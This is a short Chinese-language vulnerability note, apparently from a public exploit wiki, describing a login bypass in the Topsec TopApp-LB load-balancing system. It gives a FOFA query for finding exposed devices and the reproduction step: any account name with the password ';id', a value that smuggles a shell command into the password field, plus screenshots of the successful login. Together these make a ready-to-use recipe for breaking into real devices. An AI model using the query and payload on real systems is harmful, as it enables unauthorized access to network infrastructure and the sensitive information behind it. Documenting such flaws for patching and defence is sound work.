# 天融信负载均衡TopApp-LB任意登陆

## 漏洞描述

天融信负载均衡TopApp-LB系统无需密码可直接登陆，查看敏感信息

## 影响版本

天融信负载均衡TopApp-LB

## FOFA

> [!NOTE]
>
> app="天融信-TopApp-LB-负载均衡系统"

## 漏洞复现

在登录页面中输入，账号:**任意账号**  密码:**;id**

![](http://wikioss.peiqi.tech/vuln/trx-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

成功登录

![](http://wikioss.peiqi.tech/vuln/trx-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)